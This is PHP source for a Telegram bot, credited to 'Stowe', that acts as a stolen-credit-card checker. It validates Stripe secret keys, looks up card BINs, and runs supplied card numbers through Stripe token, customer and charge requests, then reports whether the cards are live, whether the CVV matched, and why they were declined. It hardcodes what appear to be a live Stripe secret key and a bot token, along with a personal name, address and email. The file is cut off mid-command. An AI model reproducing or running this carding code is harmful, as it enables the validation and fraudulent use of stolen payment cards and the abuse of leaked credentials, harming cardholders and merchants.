<?php

$botToken = "5020014857:AAEKpsdaG879QntGTTXbK3qgbc5c6nxB46k"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$usernamee = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
    };
    function multiexplode($delimiters, $string)
    {
      $one = str_replace($delimiters, $delimiters[0], $string);
      $two = explode($delimiters[0], $one,$string);
      return $two;
    }
    function random_strings($length_of_string) 
    {
        $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
        return substr(str_shuffle($str_result),  
                           0, $length_of_string); 
    }

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
 sendMessage($chatId, "<b>Hello @$usernamee!!%0AType /help to know all my commands!!%0A%0ABot Made by: Stowe .</b>", $message_id);
sendMessage($chatId, "What's new in this version 2.0 <code>(DEBUG VERSION)</code> ?%0A%0A<b>Re-Wirte all command</b>%0A%0A<b>Remove not working command</b>%0A%0A<b>receipt url added</b>%0A%0A<b>Fix Ris kcore not working </b>%0A%0A<b> CCN CHAGRES </b>%0A", $message_id);
}

//////////=========[help Command]=========//////////
 elseif (strpos($message, "/help") === 0){
sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_xxxxxxxxxxxxx%0A<u>charge 1$:</u> <code>/chg</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/web</code>%0A<u>charge 5$:</u> <code>/rap</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>kill 50$:</u> <code>/kcc</code> xxxxxxxxxxxxxxxx|xx|xx|xxx<u>%0A<u>CCN charge 1$:</u> <code>/ccn</code> xxxxxxxxxxxxxxxx|xx|xx%0A%0AInfo:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: stowe .</b>", $message_id);
}
//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$usernamee%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
}
//////////=========[web Command]=========//////////

elseif (strpos($message, "/web") === 0){
  sendMessage($chatId, "<b>COMMING SOON </b>", $message_id);
  }

//////////=========[log Command]=========//////////

elseif (strpos($message, "/log") === 0){
 sendMessage($chatId, "What's new in this version 2.0 <code>(DEBUG VERSION)</code> ?%0A%0A<b>Re-Wirte all command</b>%0A%0A<b>Remove not working command</b>%0A%0A<b>receipt url added</b>%0A%0A<b>Fix Ris kcore not working </b>%0A%0A<b> CCN CHAGRES </b>%0A", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$usernamee.'%0A%0A<b>Bot Made by: Stowe .</b>', $message_id);
}
//=====================[SK]=============================//
elseif (strpos($message, "/sk") === 0){
    $sec = substr($message, 4);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
    curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (strpos($result, 'api_key_expired')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Invalid API Key provided')){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
    sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
    }
    elseif (strpos($result, 'Request rate limit exceeded')){
    sendMessage($chatId, "<b>⚠️ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Rate Limit Key%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
    }else{
    sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Stowe .</b>", $message_id);
    };}
//////////=========[aut Command]=========//////////
elseif (strpos($message, "/aut") === 0){
  $skeys = array(
      1 => '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', // Enter at least one sk key
    //2 => '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',-----------------|
    //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
    //4 => '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',                 |
    //5 => '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',-----------------|
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];



$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
          $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
          'Host: lookup.binlist.net',
          'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
          'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $fim = curl_exec($ch);
          $bank = GetStr($fim, '"bank":{"name":"', '"');
          $name = GetStr($fim, '"name":"', '"');
          $brand = GetStr($fim, '"brand":"', '"');
          $country = GetStr($fim, '"country":{"name":"', '"');
          $emoji = GetStr($fim, '"emoji":"', '"');
          $scheme = GetStr($fim, '"scheme":"', '"');
          $type = GetStr($fim, '"type":"', '"');
          if(strpos($fim, '"type":"credit"') !== false){
          $bin = 'Credit';
          }else{
          $bin = 'Debit';
          };
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
          $result1 = curl_exec($ch);
          $tok1 = Getstr($result1,'"id": "','"');
          $msg1 = Getstr($result1,'"message": "','"');
          $msg1a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result1, "card_error")){
            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0<b>Respone 2 -» $msg1a </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "card_declined")){
            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Respone 2 -» $msg1a </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
          $result2 = curl_exec($ch);
          $tok2 = Getstr($result2,'"id": "','"');
          $msg2 = Getstr($result2,'"message": "','"');
          $msg2a = Getstr($result1,'"decline_code": "','"');
          if(strpos($result1, "card_error")){
            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0<b>Respone 2 -» $msg2a </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          if (strpos($result1, "card_declined")){
            sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Respone 2 -» $msg2a </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
            return;
          }
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$tok2.'/sources/'.$tok1.'');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
          $result3 = curl_exec($ch);
          $msg3 = Getstr($result3,'"message": "','"');
          if(strpos($result3, '"cvc_check": "pass"' )) {
          sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» APPROVED ✅</b>%0A<b>Response -» CARD SAVED SUCSSEDFULLY ✅</b>%0A<b>Gateway -» Stripe auth v2 </b>%0A%0A---------[Bin details]-----------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY: $country %0A%0A%0A--------------------------------%0A%0A%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
          }
          else {
            sendMessage($chatId, "<b>Your cc: $lista</b>\nResult: $msg2 | $msg3\nBot by: @xxx", $message_id);
            }
          }
//////////=========[shg Command]=========//////////
// elseif (strpos($message, "/shg") === 0){
   
// $message = substr($message, 5);
// $sk = multiexplode(array("/", ":", " ", "|"), $message)[0];
// $cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
// $mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
// $yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
// $cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
// if (empty($sk)) {
// $sk = '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';
// }
//         $amount = $amt * 100;
//         $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
//         curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//         'Host: lookup.binlist.net',
//         'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
//         'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_POSTFIELDS, '');
//         $fim = curl_exec($ch);
//         $bank = GetStr($fim, '"bank":{"name":"', '"');
//         $name = GetStr($fim, '"name":"', '"');
//         $brand = GetStr($fim, '"brand":"', '"');
//         $country = GetStr($fim, '"country":{"name":"', '"');
//         $emoji = GetStr($fim, '"emoji":"', '"');
//         $scheme = GetStr($fim, '"scheme":"', '"');
//         $type = GetStr($fim, '"type":"', '"');
//         if(strpos($fim, '"type":"credit"') !== false){
//         $bin = 'Credit';
//         }else{
//         $bin = 'Debit';
//         };
//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
//         $result1 = curl_exec($ch);
//         $tok1 = Getstr($result1,'"id": "','"');
//         $msg1 = Getstr($result1,'"message": "','"');
//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
//         $result2 = curl_exec($ch);
//         $tok2 = Getstr($result2,'"id": "','"');
//         $msg2 = Getstr($result2,'"message": "','"');
//         $ch = curl_init();
//         curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
//         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
//         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
//         curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&customer='.$tok2.'');
//         $result3 = curl_exec($ch);
//         $msg2 = Getstr($result3,'"message": "','"');
//         $rcp = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
//         if(strpos($result3, '"seller_message": "Payment complete."' )) {
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Successfully Charged ₹$amt ✅</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b>%0A<b>RECEPIT URL -» $rcp </b>%0A @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
//         }
//         elseif(strpos($result2, "insufficient_funds" )) {
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Insufficient Funds</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){ sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» 3D Card</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif(strpos($result2,'"cvc_check": "pass"')){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Payment Cannot Be Completed</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif(strpos($result2,'"code": "incorrect_cvc"')){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe charge 1$</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif(strpos($result1,'"code": "incorrect_cvc"')){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CCN Matched ✅</b>%0A<b>Response -» CVV MISSMATCH</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result3, "transaction_not_allowed")) || (strpos($result2, "transaction_not_allowed"))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» CVV Matched ✅</b>%0A<b>Response -» Transaction Not Allowed</b>%0A<b>Gateway -» Stripe charge 1$</b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result3, "fraudulent")) || (strpos($result2, "fraudulent"))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Fraudulent</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result3, "expired_card")) || (strpos($result2, "expired_card"))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Expired Card</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result3, "generic_declined")) || (strpos($result2, "generic_declined"))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
//         }
//         elseif ((strpos($result3, "do_not_honor")) || (strpos($result2, "do_not_honor"))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Do Not Honor</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result2, 'rate_limit')) || (strpos($result2, 'rate_limit'))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» SK IS AT RATE LIMIT</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
        
//         elseif ((strpos($result3, "Your card was declined.")) || (strpos($result2, "Your card was declined."))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Generic Declined</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         elseif ((strpos($result1, ' "message": "Your card number is incorrect."')) || (strpos($result2, ' "message": "Your card number is incorrect."'))){
//         sendMessage($chatId, "<b>Card: <code>$lista</code></b>%0A<b>Status -» Card Number Is Incorrect</b>%0A<b>Response -» Declined ❌</b>%0A<b>Gateway -» Stripe charge 1$ </b>%0A%0A<b>⋆ Checked By:</b> @$usernam%0A%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);}
//         else {
//         sendMessage($chatId, "<b><u><i>Unknown Error. $msg1 - $msg2</i></u></b>", $message_id);
//         };

//     }
    //////////=========[chg Command]=========//////////
    elseif (strpos($message, "/chg") === 0){
        $skeys = array(
            1 => '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', // Enter at least one sk key
          //2 => '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',-----------------|
          //3 => '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',                 | Uncomment this, if you want to add more sk keys :)
          //4 => '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',                 |
          //5 => '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',-----------------|
          ); 
          $skey = array_rand($skeys);
          $sk = $skeys[$skey];
      

    
$message = substr($message, 4);
$amt = multiexplode(array("/", ":", " ", "|"), $message)[0];
$cc = multiexplode(array(":", "/", " ", "|"), $message)[1];
$mm = multiexplode(array(":", "/", " ", "|"), $message)[2];
$yy = multiexplode(array(":", "/", " ", "|"), $message)[3];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[4];
                $lista = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
                curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch);
                $bank = GetStr($fim, '"bank":{"name":"', '"');
                $name = GetStr($fim, '"name":"', '"');
                $brand = GetStr($fim, '"brand":"', '"');
                $country = GetStr($fim, '"country":{"name":"', '"');
                $emoji = GetStr($fim, '"emoji":"', '"');
                $scheme = GetStr($fim, '"scheme":"', '"');
                $type = GetStr($fim, '"type":"', '"');
                if(strpos($fim, '"type":"credit"') !== false){
                $bin = 'Credit';
                }else{
                $bin = 'Debit';
                };
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Corey Stowe&owner[email]=cstowe083@gmail.com&owner[address][line1]=2509 Mountainview Dr&owner[address][city]=Corinth&owner[address][state]=Texas&owner[address][postal_code]=87210&owner[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'');
                $result1 = curl_exec($ch);
                $tok1 = Getstr($result1,'"id": "','"');
                $msg1 = Getstr($result1,'"message": "','"');
                if(strpos($result1, "card_error")){
                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                }
                if (strpos($result1, "card_declined")){
                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg1 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                }
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'description=Stowe&source='.$tok1.'&address[line1]=2509 Mountainview Dr&address[city]=Corinth&address[state]=Texas&address[postal_code]=87210&address[country]=US');
                $result2 = curl_exec($ch);
                $tok2 = Getstr($result2,'"id": "','"');
                $msg2 = Getstr($result2,'"message": "','"');
                if(strpos($result2, "card_error")){
                  sendMessage($chatId, " %0A<b>Card: <code>$lista</code></b>%0A<b>Status -» DECLINED ❌</b>%0A<b>Response -» $msg2 </b>%0A<b>Gateway -» Stripe auth v2 </b>%0a%0a-----------[Bin details]--------------%0A%0ABANK NAME: $bank %0ANAME : $name %0ABRAND: $brand %0ASCHEME: $scheme %0ATYPE: $type %0ACOUNTRY:$country%0A%0A-----------------------------%0A%0A<b>⋆ Checked By: @$usernamee</b>%0A<b>⋆ Bot By:@stowe_245</b>", $message_id);
                  return;
                }

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
